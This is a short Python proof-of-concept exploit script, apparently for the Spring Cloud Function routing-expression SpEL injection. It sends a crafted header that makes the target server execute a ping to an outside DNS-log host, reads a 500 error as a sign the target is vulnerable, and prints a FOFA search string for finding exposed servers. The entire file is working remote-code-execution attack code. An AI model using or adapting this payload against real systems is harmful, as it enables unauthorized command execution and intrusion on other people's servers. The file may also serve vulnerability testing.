# /bin/bash/env python3
# _*_coding:utf-8_*_

import os
import re
import sys
import requests

from requests.packages.urllib3.exceptions import InsecureRequestWarning



def title():
    print('+          FOFA: "Spring Cloud Function"')


def run_proto(url):
    check_url = url + '/functionRouter'
    payload = f'T(java.lang.Runtime).getRuntime().exec("ping n8mi68.dnslog.cn")'
    data = 'test'
    headers = {
        'spring.cloud.function.routing-expression': payload,
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'Accept-Language': 'en',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36',
        'Content-Type': 'application/x-www-form-urlencoded'
    }
    try:
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=check_url, headers=headers, data=data, verify=False, timeout=(3, 3), allow_redirects=False)
        reC = re.search('error.*?Internal.{1,2}Server.{1,2}Error', response.text, re.I)
        if reC and response.status_code == 500:
            return True
        else:
            return False
    except Exception as e:
        print(e)
        return False


def run(ip, port):
    i = 0
    proto = ['http', 'https']
    while i < 2:
        url = '{}://{}:{}'.format(proto[i], ip, port)
        if run_proto(url):
            return True
        else:
            i = i + 1


if __name__ == '__main__':
    title()
    target = '192.168.73.134:8080'
    ip = target.split(':')[0]
    port = int(target.split(':')[1])
    result = run(ip, port)

    if result:
        print("Exist")
    else:
        print("UnExist")
